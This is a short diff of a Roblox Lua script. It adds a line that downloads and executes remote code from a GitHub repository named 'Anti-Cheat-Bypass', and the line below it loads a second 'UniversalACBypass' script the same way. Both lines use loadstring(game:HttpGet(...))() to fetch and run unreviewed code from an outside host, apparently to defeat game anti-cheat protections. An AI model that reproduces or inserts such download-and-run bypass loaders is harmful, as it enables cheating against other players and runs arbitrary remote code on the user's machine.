@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Who-Is-E/Anti-Cheat-Bypass/main/Bypass.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))()
 
 local HttpService = game:GetService("HttpService")
